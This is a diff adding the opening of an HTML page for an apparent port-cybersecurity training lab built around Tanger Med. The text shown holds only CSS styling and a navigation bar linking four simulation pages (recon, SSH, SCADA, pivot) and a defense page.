@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Smart Port Cybersecurity Lab — Tanger Med · 4 Real Simulations</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Archivo+Black&family=Archivo:wght@300;400;500;600&family=Fira+Code:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════════════════════════════════════════
+   DESIGN: CLASSIFIED CYBER INTELLIGENCE TERMINAL
+   Aesthetic: Military-grade dark ops + live terminal
+   Fonts: Archivo Black (display) · Archivo (body) · Fira Code (mono)
+   Color: Deep navy + electric cyan + alert red + success green
+═══════════════════════════════════════════════════ */
+:root{
+  --void:#02060f;--abyss:#040b18;--deep:#070f22;--surf:#0b1830;--panel:#0f2040;
+  --bdr:rgba(0,220,200,.07);--bdr2:rgba(0,220,200,.16);--bdr3:rgba(0,220,200,.28);
+  --cyan:#00dcc8;--cyan2:#00b8a8;--ca:rgba(0,220,200,.08);--cb:rgba(0,220,200,.16);
+  --red:#ff3355;--ra:rgba(255,51,85,.09);--rb:rgba(255,51,85,.2);
+  --amber:#ffaa00;--aa:rgba(255,170,0,.1);
+  --green:#00e676;--ga:rgba(0,230,118,.09);
+  --blue:#4da8ff;--ba:rgba(77,168,255,.09);
+  --violet:#cc77ff;--va:rgba(204,119,255,.09);
+  --bone:#cce8ff;--warm:#7aa0c4;--fog:#1e3a58;--ghost:rgba(0,220,200,.03);
+  --disp:'Archivo Black',impact,sans-serif;
+  --body:'Archivo',system-ui,sans-serif;
+  --mono:'Fira Code',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;font-size:16px;}
+body{background:var(--void);color:var(--warm);font-family:var(--body);overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;z-index:9998;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.028) 3px,rgba(0,0,0,.028) 4px);}
+::-webkit-scrollbar{width:3px;}::-webkit-scrollbar-track{background:var(--void);}::-webkit-scrollbar-thumb{background:var(--cyan2);}
+
+/* ─── CURSOR ─── */
+#CUR{position:fixed;width:7px;height:7px;background:var(--cyan);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 12px var(--cyan);}
+#CUR2{position:fixed;width:30px;height:30px;border:1px solid rgba(0,220,200,.35);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:all .16s ease;}
+
+/* ─── NAV ─── */
+#nav{position:fixed;top:0;left:0;right:0;z-index:800;height:52px;background:rgba(2,6,15,.95);backdrop-filter:blur(20px);border-bottom:1px solid var(--bdr);}
+.nw{max-width:1280px;margin:0 auto;padding:0 28px;height:100%;display:flex;align-items:center;gap:0;}
+.nlogo{font-family:var(--mono);font-size:10.5px;letter-spacing:2px;color:var(--cyan);cursor:pointer;margin-right:32px;display:flex;align-items:center;gap:8px;text-transform:uppercase;}
+.nls{width:20px;height:20px;border:1.5px solid var(--cyan);display:flex;align-items:center;justify-content:center;font-size:8px;font-weight:700;}
+.nlinks{display:flex;gap:2px;flex:1;flex-wrap:wrap;}
+.nl{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;text-transform:uppercase;color:var(--warm);padding:5px 11px;border:1px solid transparent;background:none;cursor:pointer;transition:all .18s;}
+.nl:hover{color:var(--bone);border-color:var(--bdr2);}
+.nl.on{color:var(--cyan);border-color:var(--cb);background:var(--ca);}
+.nstatus{margin-left:auto;font-family:var(--mono);font-size:8.5px;color:var(--fog);display:flex;align-items:center;gap:5px;letter-spacing:1px;}
+.npulse{width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.3;transform:scale(.7);}}
+
+/* ─── PAGE SYSTEM ─── */
+.pg{display:none;min-height:100vh;}
+.pg.on{display:block;animation:fadein .35s ease both;}
+@keyframes fadein{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+
+/* ─── LAYOUT ─── */
+.W{max-width:1280px;margin:0 auto;padding:0 28px;}
+.SP{padding:56px 0;}.SP2{padding:40px 0;}
+
+/* ─── TYPE ─── */
+.DXL{font-family:var(--disp);font-size:clamp(60px,8vw,128px);line-height:.92;color:var(--bone);letter-spacing:-1px;}
+.DL{font-family:var(--disp);font-size:clamp(42px,5.5vw,88px);line-height:.95;color:var(--bone);}
+.DM{font-family:var(--disp);font-size:clamp(30px,4vw,56px);line-height:1;color:var(--bone);}
+.DS{font-family:var(--disp);font-size:clamp(20px,2.5vw,34px);line-height:1.05;color:var(--bone);}
+.tc{color:var(--cyan);}.tr{color:var(--red);}.ta{color:var(--amber);}.tg{color:var(--green);}.tb{color:var(--blue);}.tv{color:var(--violet);}
+.BL{font-size:17px;line-height:1.82;}.BM{font-size:14.5px;line-height:1.78;}.BS{font-size:12.5px;line-height:1.7;color:var(--fog);}
+strong{color:var(--bone);font-weight:600;}
+
+/* ─── EYEBROW ─── */
+.eye{font-family:var(--mono);font-size:8.5px;letter-spacing:3.5px;text-transform:uppercase;color:var(--cyan);display:flex;align-items:center;gap:9px;margin-bottom:12px;}
+.eye::before{content:'//';color:var(--fog);}
+.eye.R{color:var(--red);}.eye.R::before{color:rgba(255,51,85,.3);}
+.eye.A{color:var(--amber);}.eye.A::before{color:rgba(255,170,0,.3);}
+.eye.G{color:var(--green);}.eye.G::before{color:rgba(0,230,118,.3);}
+.eye.V{color:var(--violet);}.eye.V::before{color:rgba(204,119,255,.3);}
+.eye.B{color:var(--blue);}.eye.B::before{color:rgba(77,168,255,.3);}
+
+/* ─── REVEAL ─── */
+.rv{opacity:0;transform:translateY(20px);transition:opacity .65s ease,transform .65s ease;}
+.rv.vis{opacity:1;transform:none;}
+
+/* ─── HERO ─── */
+.hero{min-height:100vh;position:relative;display:flex;align-items:center;padding-top:52px;overflow:hidden;}
+#heroCanvas{position:absolute;inset:0;z-index:0;}
+.hgrid{position:absolute;inset:0;z-index:1;pointer-events:none;
+  background-image:linear-gradient(rgba(0,220,200,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,220,200,.025) 1px,transparent 1px);
+  background-size:80px 80px;
+  mask-image:radial-gradient(ellipse 70% 65% at 20% 50%,black,transparent);}
+.hvig{position:absolute;inset:0;z-index:2;pointer-events:none;background:radial-gradient(ellipse 120% 90% at 50% 110%,transparent 25%,var(--void) 72%);}
+.hcontent{position:relative;z-index:3;padding:44px 0 52px;}
+/* Hero: 2-column layout */
+.h2col{display:grid;grid-template-columns:1fr 480px;gap:44px;align-items:center;}
+@media(max-width:1100px){.h2col{grid-template-columns:1fr 380px;gap:28px;}}
+@media(max-width:820px){.h2col{grid-template-columns:1fr;}}
+.hleft{}
+.hright{}
+.hbadge{display:inline-flex;align-items:center;gap:9px;background:var(--ca);border:1px solid var(--cb);padding:4px 14px 4px 8px;margin-bottom:16px;}
+.hbdot{width:5px;height:5px;border-radius:50%;background:var(--cyan);animation:pulse 1.5s infinite;}
+.hbt{font-family:var(--mono);font-size:9px;letter-spacing:2.5px;text-transform:uppercase;color:var(--cyan);}
+.hkicker{font-family:var(--mono);font-size:clamp(11px,1.3vw,13px);letter-spacing:6px;text-transform:uppercase;color:var(--fog);margin-bottom:6px;}
+.htags{display:flex;flex-wrap:wrap;gap:5px;margin:16px 0 20px;}
+.htag{font-family:var(--mono);font-size:8px;letter-spacing:1.5px;text-transform:uppercase;padding:3px 10px;border:1px solid;cursor:default;transition:transform .2s;}
+.htag:hover{transform:translateY(-2px);}
+.ht0{color:var(--cyan);border-color:var(--cb);background:var(--ca);}
+.ht1{color:var(--red);border-color:var(--rb);background:var(--ra);}
+.ht2{color:var(--amber);border-color:rgba(255,170,0,.22);background:var(--aa);}
+.ht3{color:var(--blue);border-color:rgba(77,168,255,.18);background:var(--ba);}
+.ht4{color:var(--violet);border-color:rgba(204,119,255,.18);background:var(--va);}
+.ht5{color:var(--green);border-color:rgba(0,230,118,.18);background:var(--ga);}
+
+/* stats bar */
+.hstats{display:flex;gap:0;border:1px solid var(--bdr2);overflow:hidden;width:100%;margin-top:20px;}
+.hstat{flex:1;padding:14px 16px;background:var(--surf);border-right:1px solid var(--bdr);text-align:center;position:relative;}
+.hstat:last-child{border-right:none;}
+.hstat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.hs0::before{background:var(--cyan);}
+.hs1::before{background:var(--red);}
+.hs2::before{background:var(--amber);}
+.hs3::before{background:var(--violet);}
+.hsv{font-family:var(--disp);font-size:28px;line-height:1;display:block;margin-bottom:3px;}
+.hs0 .hsv{color:var(--cyan);}
+.hs1 .hsv{color:var(--red);}
+.hs2 .hsv{color:var(--amber);}
+.hs3 .hsv{color:var(--violet);}
+.hsl{font-family:var(--mono);font-size:7.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--fog);}
+
+/* ─── TERMINAL ─── */
+.term{background:#000d1f;border:1px solid var(--bdr);overflow:hidden;}
+.tbar{background:var(--deep);padding:8px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--bdr);}
+.td1{width:9px;height:9px;border-radius:50%;background:#ff5f57;}
+.td2{width:9px;height:9px;border-radius:50%;background:#febc2e;}
+.td3{width:9px;height:9px;border-radius:50%;background:#28c840;}
+.ttit{font-family:var(--mono);font-size:9px;color:var(--fog);margin-left:auto;letter-spacing:1px;}
+.tbody{padding:12px 14px;font-family:var(--mono);font-size:10px;line-height:1.85;min-height:210px;}
+.tbody div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.lc{color:rgba(0,180,160,.3);}.lg{color:#3ddc84;}.lr{color:#ff6b7a;}.la{color:#ffc857;}.lb{color:var(--blue);}.lp{color:var(--violet);}.lw{color:var(--bone);}.lm{color:var(--warm);}
+.blink::after{content:'▌';animation:pulse .75s step-start infinite;color:var(--cyan);}
+
+/* ─── CARDS/PANELS ─── */
+.card{background:var(--abyss);border:1px solid var(--bdr);transition:background .22s,border-color .22s;}
+.card:hover{background:var(--deep);border-color:var(--bdr2);}
+.panel{background:var(--deep);border:1px solid var(--bdr);}
+
+/* ─── CODE BLOCK ─── */
+pre.CB,div.CB{background:#000d1f;border:1px solid rgba(0,220,200,.1);border-left:3px solid var(--cyan);padding:18px 20px;font-family:var(--mono);font-size:11.5px;line-height:1.95;overflow-x:auto;margin:12px 0;white-space:pre-wrap;word-break:break-word;tab-size:4;border-radius:0;}
+pre.CB.R,div.CB.R{border-left-color:var(--red);}
+pre.CB.A,div.CB.A{border-left-color:var(--amber);}
+pre.CB.G,div.CB.G{border-left-color:var(--green);}
+pre.CB.V,div.CB.V{border-left-color:var(--violet);}
+.CB .CC{color:rgba(100,155,185,.55);font-style:italic;}
+.CB .CMD{color:#5ec9ff;font-weight:600;}
+.CB .FLG{color:#7dd87a;}
+.CB .VAL{color:#e8d28a;}
+.CB .OUT{color:#9db8c8;}
+.CB .OK{color:#3ddc84;font-weight:500;}
+.CB .ERR{color:#ff7085;font-weight:600;}
+.CB .WRN{color:#ffc857;}
+
+/* ─── INFO BOX ─── */
+.IB{border:1px solid;padding:16px 18px;margin:14px 0;border-left:3px solid;}
+.IB.C{border-color:rgba(0,220,200,.18);background:var(--ca);border-left-color:var(--cyan);}
+.IB.R{border-color:var(--rb);background:var(--ra);border-left-color:var(--red);}
+.IB.A{border-color:rgba(255,170,0,.18);background:var(--aa);border-left-color:var(--amber);}
+.IB.G{border-color:rgba(0,230,118,.18);background:var(--ga);border-left-color:var(--green);}
+.IB.V{border-color:rgba(204,119,255,.18);background:var(--va);border-left-color:var(--violet);}
+.ibl{font-family:var(--mono);font-size:8px;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;}
+.IB.C .ibl{color:var(--cyan);}
+.IB.R .ibl{color:var(--red);}
+.IB.A .ibl{color:var(--amber);}
+.IB.G .ibl{color:var(--green);}
+.IB.V .ibl{color:var(--violet);}
+.IB p{font-size:13.5px;line-height:1.75;}
+
+/* ─── TAGS ─── */
+.tag{font-family:var(--mono);font-size:8px;letter-spacing:1px;text-transform:uppercase;padding:2px 8px;border:1px solid;display:inline-block;margin:2px;}
+.t0{color:var(--cyan);border-color:var(--cb);background:var(--ca);}
+.t1{color:var(--red);border-color:var(--rb);background:var(--ra);}
+.t2{color:var(--amber);border-color:rgba(255,170,0,.22);background:var(--aa);}
+.t3{color:var(--blue);border-color:rgba(77,168,255,.18);background:var(--ba);}
+.t4{color:var(--violet);border-color:rgba(204,119,255,.18);background:var(--va);}
+.t5{color:var(--green);border-color:rgba(0,230,118,.18);background:var(--ga);}
+.tsm{font-family:var(--mono);font-size:8px;letter-spacing:1px;text-transform:uppercase;padding:2px 7px;border:1px solid;display:inline-block;margin:2px;}
+
+/* ─── CVSS ─── */
+.CVSS{font-family:var(--mono);font-size:10.5px;font-weight:700;padding:2px 9px;display:inline-block;}
+.CVSS.C{color:var(--red);background:var(--ra);border:1px solid var(--rb);}
+.CVSS.H{color:var(--amber);background:var(--aa);border:1px solid rgba(255,170,0,.22);}
+.CVSS.M{color:var(--blue);background:var(--ba);border:1px solid rgba(77,168,255,.18);}
+.CVSS.L{color:var(--green);background:var(--ga);border:1px solid rgba(0,230,118,.18);}
+
+/* ─── TABLE ─── */
+table.T{width:100%;border-collapse:collapse;}
+table.T th{background:var(--deep);padding:11px 14px;font-family:var(--mono);font-size:8.5px;letter-spacing:2px;text-transform:uppercase;color:var(--fog);text-align:left;border:1px solid var(--bdr);}
+table.T td{padding:12px 14px;border:1px solid var(--bdr);font-size:13px;vertical-align:middle;}
+table.T tr:hover td{background:rgba(0,220,200,.02);}
+.cve-id{font-family:var(--mono);font-size:10.5px;color:var(--blue);}
+
+/* ─── DETAIL LAYOUT ─── */
+.DTL{display:grid;grid-template-columns:1fr 320px;gap:52px;}
+@media(max-width:1000px){.DTL{grid-template-columns:1fr;}}
+.SB{position:sticky;top:66px;height:fit-content;}
+.SBC{background:var(--abyss);border:1px solid var(--bdr);overflow:hidden;margin-bottom:12px;}
+.SBH{background:var(--deep);padding:9px 13px;font-family:var(--mono);font-size:8.5px;letter-spacing:2px;text-transform:uppercase;color:var(--warm);border-bottom:1px solid var(--bdr);display:flex;align-items:center;gap:6px;}
+.SBH::before{content:'▸';color:var(--cyan);font-size:8px;}
+.SBB{padding:13px;}
+.KPI{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--bdr);}
+.KPI:last-child{border-bottom:none;}
+.KL{font-family:var(--mono);font-size:9px;color:var(--fog);letter-spacing:.5px;}
+.KV{font-family:var(--disp);font-size:22px;}
+
+/* ─── STEP ─── */
+.step{display:grid;grid-template-columns:38px 1fr;border:1px solid var(--bdr);overflow:hidden;margin-bottom:3px;transition:border-color .2s;}
+.step:hover{border-color:var(--bdr2);}
+.stepN{display:flex;align-items:flex-start;justify-content:center;padding-top:17px;font-family:var(--mono);font-size:11px;font-weight:700;color:white;}
+.N0{background:var(--cyan2);}.N1{background:#c01828;}.N2{background:#b07200;}.N3{background:#1864a0;}.N4{background:#6028a8;}.N5{background:#0a7840;}
+.stepB{padding:15px 17px;background:var(--abyss);}
+.stepB h4{font-size:14px;font-weight:700;color:var(--bone);margin-bottom:6px;}
+.stepB p{font-size:13px;line-height:1.73;}
+
+/* ─── ALERTS ─── */
+.AL{display:flex;flex-direction:column;gap:3px;margin:10px 0;}
+.AE{display:grid;grid-template-columns:42px 96px 1fr;border:1px solid var(--bdr);overflow:hidden;}
+.AEL{display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:9px;font-weight:700;color:white;padding:7px 0;}
+.LC{background:rgba(255,51,85,.75);}
+.LH{background:rgba(255,170,0,.7);}
+.LM{background:rgba(77,168,255,.6);}
+.LG{background:rgba(0,230,118,.55);}
+.AER{display:flex;align-items:center;padding:0 8px;font-family:var(--mono);font-size:9px;background:var(--panel);border-right:1px solid var(--bdr);}
+.AEM{display:flex;align-items:center;padding:8px 11px;font-family:var(--mono);font-size:9.5px;background:var(--abyss);}
+
+/* ─── SIEM LOG ─── */
+.SIEM{background:#000d1f;border:1px solid var(--bdr);border-top:2px solid var(--cyan);overflow:hidden;margin:14px 0;}
+.SIEMH{background:var(--deep);padding:7px 12px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--bdr);}
+.SIEMT{font-family:var(--mono);font-size:8.5px;color:var(--cyan);letter-spacing:1px;}
+.SIEML{display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:8px;color:var(--green);}
+.SIEMB{padding:10px 12px;font-family:var(--mono);font-size:9.5px;line-height:2;}
+.SL{display:flex;gap:10px;flex-wrap:wrap;border-bottom:1px solid rgba(0,220,200,.04);padding:1px 0;}
+.SL:last-child{border-bottom:none;}
+.SLT{color:var(--fog);min-width:58px;flex-shrink:0;}
+.SLEV{font-weight:700;min-width:78px;flex-shrink:0;}
+.slC{color:var(--red);}.slH{color:var(--amber);}.slI{color:var(--cyan);}.slG{color:var(--green);}
+.SLM{color:var(--warm);}
+
+/* ─── STATS ROW ─── */
+.STATS{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--bdr);border:1px solid var(--bdr);margin:18px 0;}
+.SC{background:var(--abyss);padding:16px;text-align:center;}
+.SCV{font-family:var(--disp);font-size:28px;font-weight:900;line-height:1;display:block;margin-bottom:3px;}
+.SCL{font-family:var(--mono);font-size:8px;letter-spacing:1.5px;text-transform:uppercase;color:var(--fog);}
+
+/* ─── BAN TIMELINE ─── */
+.BAN{display:flex;flex-direction:column;gap:6px;}
+.BANI{display:grid;grid-template-columns:76px 1fr auto;align-items:center;gap:10px;background:var(--abyss);border:1px solid var(--bdr);padding:11px 13px;}
+.BN{font-family:var(--mono);font-size:9px;color:var(--fog);}
+.BD{font-size:12.5px;}
+.BV{font-family:var(--disp);font-size:22px;}
+
+/* ─── INJECT DEMO ─── */
+.INJECD{background:var(--void);border:1px solid rgba(204,119,255,.2);overflow:hidden;margin:12px 0;}
+.INJEDH{background:var(--deep);padding:8px 13px;font-family:var(--mono);font-size:8.5px;letter-spacing:2px;text-transform:uppercase;color:var(--fog);border-bottom:1px solid var(--bdr);}
+.INJEDB{padding:12px 14px;font-family:var(--mono);font-size:11px;line-height:2.3;}
+.Is{color:var(--blue);}.Io{color:var(--green);}.Ia{color:var(--fog);margin:0 7px;}.If{color:var(--red);font-weight:700;}.Ist{color:var(--amber);font-size:9.5px;}
+
+/* ─── NETWORK DIAGRAM ─── */
+.NETD{background:var(--deep);border:1px solid var(--bdr);padding:24px;margin:20px 0;overflow-x:auto;}
+.NDTIT{font-family:var(--mono);font-size:8.5px;letter-spacing:2px;text-transform:uppercase;color:var(--fog);margin-bottom:18px;}
+.NDROW{display:flex;align-items:center;justify-content:center;gap:0;flex-wrap:wrap;}
+.NDNODE{display:flex;flex-direction:column;align-items:center;gap:5px;}
+.NDI{width:54px;height:54px;border:2px solid;display:flex;align-items:center;justify-content:center;font-size:22px;}
+.NDI.R{border-color:var(--red);}.NDI.C{border-color:var(--cyan);}.NDI.V{border-color:var(--violet);}
+.NDL{font-family:var(--mono);font-size:8.5px;text-align:center;color:var(--bone);text-transform:uppercase;letter-spacing:1px;}
+.NDIP{font-family:var(--mono);font-size:8px;color:var(--fog);}
+.NDCONN{padding:0 14px;display:flex;flex-direction:column;align-items:center;gap:5px;}
+.NDLINE{height:2px;width:90px;position:relative;}
+.NDLINE::after{content:'▶';position:absolute;right:-7px;top:-9px;font-size:11px;}
+.NDLINE.R{background:var(--red);}.NDLINE.R::after{color:var(--red);}
+.NDLINE.C{background:var(--cyan);}.NDLINE.C::after{color:var(--cyan);}
+.NDLINE.V{background:var(--violet);}.NDLINE.V::after{color:var(--violet);}
+.NDTAG{font-family:var(--mono);font-size:8px;text-align:center;}
+.NDTAG.R{color:var(--red);}.NDTAG.C{color:var(--cyan);}.NDTAG.V{color:var(--violet);}
+
+/* ─── SIM HERO ─── */
+.SH{min-height:36vh;padding:72px 0 44px;position:relative;overflow:hidden;display:flex;align-items:flex-end;}
+.SHBG{position:absolute;inset:0;pointer-events:none;}
+.SHNUM{position:absolute;right:24px;bottom:-50px;font-family:var(--disp);font-size:220px;line-height:1;color:rgba(255,255,255,.02);pointer-events:none;user-select:none;}
+.BC{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:9px;letter-spacing:1.5px;text-transform:uppercase;color:var(--fog);margin-bottom:14px;}
+.BCS{color:var(--bdr2);}
+.BCC{color:var(--cyan);}
+
+/* ─── KILL CHAIN ─── */
+.KC{display:flex;align-items:stretch;overflow-x:auto;padding-bottom:4px;}
+.KCS{flex:1;min-width:140px;background:var(--abyss);border:1px solid var(--bdr);padding:18px 14px;cursor:pointer;transition:all .22s;}
+.KCS:hover,.KCS.done{background:var(--deep);border-color:var(--bdr2);}
+.KCA{padding:0 6px;display:flex;align-items:center;color:var(--fog);font-size:18px;}
+.KCN{font-family:var(--disp);font-size:38px;line-height:1;margin-bottom:5px;}
+.KCS.done .KCN{color:var(--green);}
+.KCS:not(.done) .KCN{color:rgba(255,255,255,.05);}
+.KCTI{font-family:var(--mono);font-size:8.5px;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px;}
+.KCS.done .KCTI{color:var(--green);}
+.KCS:not(.done) .KCTI{color:var(--fog);}
+.KCSUB{font-size:11px;line-height:1.55;}
+.KCBADGE{font-family:var(--mono);font-size:7.5px;letter-spacing:1.5px;text-transform:uppercase;padding:2px 6px;border:1px solid;display:inline-block;margin-top:7px;color:var(--green);border-color:rgba(0,230,118,.25);background:var(--ga);}
+
+/* ─── WHY GRID ─── */
+.WHY{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--bdr);border:1px solid var(--bdr);margin-top:24px;}
+@media(max-width:800px){.WHY{grid-template-columns:repeat(2,1fr);}}
+.WC{background:var(--abyss);padding:30px 24px;position:relative;overflow:hidden;transition:background .22s;}
+.WC:hover{background:var(--deep);}
+.WCN{font-family:var(--disp);font-size:78px;position:absolute;bottom:-14px;right:10px;opacity:.04;color:white;line-height:1;}
+.WCICO{font-size:26px;margin-bottom:12px;display:block;}
+.WCTI{font-family:var(--disp);font-size:22px;margin-bottom:7px;}
+.W0 .WCTI{color:var(--cyan);}.W1 .WCTI{color:var(--red);}.W2 .WCTI{color:var(--amber);}.W3 .WCTI{color:var(--violet);}
+.WC p{font-size:12.5px;line-height:1.7;color:var(--fog);}
+
+/* ─── REAL ATTACKS ─── */
+.RAG{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin-top:24px;}
+@media(max-width:900px){.RAG{grid-template-columns:repeat(2,1fr);}}
+@media(max-width:560px){.RAG{grid-template-columns:1fr;}}
+.RAC{background:var(--abyss);padding:24px 20px;transition:background .22s;}
+.RAC:hover{background:var(--deep);}
+.RAC.HI{background:rgba(0,220,200,.04);border:1px solid rgba(0,220,200,.1);}
+.RAY{font-family:var(--disp);font-size:50px;color:rgba(255,255,255,.04);line-height:1;margin-bottom:6px;}
+.RAT{font-family:var(--disp);font-size:21px;color:var(--bone);margin:6px 0 4px;}
+.RAC.HI .RAT{color:var(--cyan);}
+.RAP{font-family:var(--mono);font-size:9px;letter-spacing:1px;text-transform:uppercase;color:var(--fog);margin-bottom:7px;}
+.RAD{font-size:12.5px;line-height:1.72;}
+.RATGS{display:flex;flex-wrap:wrap;gap:4px;margin-top:9px;}
+.RAG2{font-family:var(--mono);font-size:8px;padding:2px 7px;border:1px solid var(--bdr);color:var(--fog);background:rgba(255,255,255,.015);}
+.RAG2.G{color:var(--cyan);border-color:var(--cb);background:var(--ca);}
+
+/* ─── SIM TABLE ─── */
+.SIMT{width:100%;border-collapse:collapse;margin-top:44px;}
+.SIMT td,.SIMT th{padding:13px 16px;border:1px solid var(--bdr);vertical-align:middle;}
+.SIMT th{background:var(--deep);font-family:var(--mono);font-size:8px;letter-spacing:2px;text-transform:uppercase;color:var(--fog);text-align:left;}
+.SIMT tr{cursor:pointer;transition:all .15s;}
+.SIMT tr:hover td{background:rgba(0,220,200,.03);}
+.SIMN{font-family:var(--disp);font-size:34px;font-weight:900;}
+.SIMT tr:nth-child(1) .SIMN{color:var(--blue);}
+.SIMT tr:nth-child(2) .SIMN{color:var(--red);}
+.SIMT tr:nth-child(3) .SIMN{color:var(--violet);}
+.SIMT tr:nth-child(4) .SIMN{color:var(--cyan);}
+.SIMTNAME{font-family:var(--disp);font-size:20px;color:var(--bone);}
+.SIMSUB{font-size:11.5px;color:var(--fog);margin-top:2px;font-family:var(--mono);}
+.VNUM{font-family:var(--disp);font-size:28px;}
+.GOBTN{font-family:var(--mono);font-size:8.5px;letter-spacing:1.5px;text-transform:uppercase;padding:6px 14px;border:1px solid var(--cb);color:var(--cyan);background:var(--ca);cursor:pointer;transition:all .18s;}
+.GOBTN:hover{background:var(--cyan);color:var(--void);}
+
+/* ─── DEFENSE GRID ─── */
+.DEFG{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin-top:44px;}
+@media(max-width:800px){.DEFG{grid-template-columns:repeat(2,1fr);}}
+.DC{background:var(--abyss);padding:26px 22px;position:relative;overflow:hidden;transition:background .22s;}
+.DC:hover{background:var(--deep);}
+.DC::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.D0::after{background:var(--cyan);}.D1::after{background:var(--red);}.D2::after{background:var(--amber);}.D3::after{background:var(--blue);}.D4::after{background:var(--green);}.D5::after{background:var(--violet);}
+.DCico{font-size:24px;display:block;margin-bottom:13px;}
+.DC h4{font-family:var(--disp);font-size:21px;margin-bottom:7px;}
+.D0 h4{color:var(--cyan);}.D1 h4{color:var(--red);}.D2 h4{color:var(--amber);}.D3 h4{color:var(--blue);}.D4 h4{color:var(--green);}.D5 h4{color:var(--violet);}
+.DC p{font-size:12.5px;line-height:1.7;color:var(--fog);}
+
+/* ─── REC CARDS ─── */
+.RECG{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:44px;}
+@media(max-width:800px){.RECG{grid-template-columns:repeat(2,1fr);}}
+@media(max-width:500px){.RECG{grid-template-columns:1fr;}}
+.RCC{border:1px solid var(--bdr);padding:20px;background:var(--surf);position:relative;transition:transform .22s,border-color .22s;}
+.RCC:hover{transform:translateY(-4px);border-color:var(--bdr2);}
+.RCC::before{content:'';position:absolute;top:0;left:0;bottom:0;width:3px;}
+.RC0::before{background:var(--red);}
+.RC1::before{background:var(--amber);}
+.RC2::before{background:var(--cyan);}
+.RCBDG{font-family:var(--mono);font-size:7.5px;letter-spacing:2px;text-transform:uppercase;padding:2px 8px;border:1px solid;display:inline-block;margin-bottom:9px;}
+.RC0 .RCBDG{color:var(--red);border-color:var(--rb);background:var(--ra);}
+.RC1 .RCBDG{color:var(--amber);border-color:rgba(255,170,0,.22);background:var(--aa);}
+.RC2 .RCBDG{color:var(--cyan);border-color:var(--cb);background:var(--ca);}
+.RCC h4{font-family:var(--disp);font-size:20px;color:var(--bone);margin-bottom:7px;}
+.RCC p{font-size:12.5px;line-height:1.7;color:var(--fog);}
+
+/* ─── HONEYPOT LOG ─── */
+.HLOG{background:var(--void);border:1px solid rgba(255,170,0,.18);padding:13px 15px;font-family:var(--mono);font-size:10.5px;line-height:2.1;max-height:260px;overflow-y:auto;margin:10px 0;}
+.HT{color:var(--fog);}.HK{color:var(--amber);font-weight:700;}.HI{color:var(--blue);}.HU{color:var(--green);}.HP{color:var(--red);font-weight:600;}
+
+/* ─── FOOTER ─── */
+footer{border-top:1px solid var(--bdr);padding:24px 28px;display:flex;justify-content:space-between;align-items:center;background:var(--deep);}
+footer .FL{font-family:var(--mono);font-size:8.5px;color:var(--fog);letter-spacing:1px;}
+footer .FR{display:flex;gap:16px;}
+footer a{font-family:var(--mono);font-size:8.5px;color:var(--cyan);text-decoration:none;letter-spacing:1px;cursor:pointer;transition:color .18s;}
+footer a:hover{color:var(--bone);}
+
+/* ─── PROOF CARDS ─── */
+.PROOT{background:var(--surf);border:1px solid var(--bdr);padding:15px 17px;border-left:3px solid;transition:border-color .2s;}
+.PROOT:hover{border-color:var(--bdr2);}
+.P0{border-left-color:var(--cyan);}.P1{border-left-color:var(--red);}.P2{border-left-color:var(--amber);}.P3{border-left-color:var(--violet);}
+.PROOT h5{font-size:13.5px;font-weight:700;color:var(--bone);margin-bottom:4px;}
+.PROOT p{font-size:12px;color:var(--fog);line-height:1.65;}
+
+@media(max-width:640px){.W{padding:0 16px;}.DXL{font-size:52px;}.hstats{flex-wrap:wrap;}.SIMT th:nth-child(3),.SIMT td:nth-child(3),.SIMT th:nth-child(4),.SIMT td:nth-child(4){display:none;}}
+</style>
+</head>
+<body>
+
+<div id="CUR"></div>
+<div id="CUR2"></div>
+
+<!-- ══════════════ NAV ══════════════ -->
+<nav id="nav">
+<div class="nw">
+  <div class="nlogo" onclick="G('home')"><div class="nls">SP</div>CyberPort·Lab</div>
+  <div class="nlinks">
+    <button class="nl on" id="NL-home" onclick="G('home')">Overview</button>
+    <button class="nl" id="NL-sim2" onclick="G('sim2')">Sim 1 — Recon</button>
+    <button class="nl" id="NL-sim1" onclick="G('sim1')">Sim 2 — SSH</button>
+    <button class="nl" id="NL-sim3" onclick="G('sim3')">Sim 3 — SCADA</button>
+    <button class="nl" id="NL-sim4" onclick="G('sim4')">Sim 4 — Pivot</button>
+    <button class="nl" id="NL-def" onclick="G('def')">Defense</button>
+  </div>
+  <div class="nstatus"><div class="npulse"></div>LAB ACTIVE</div>
+</div>
+</nav>
+
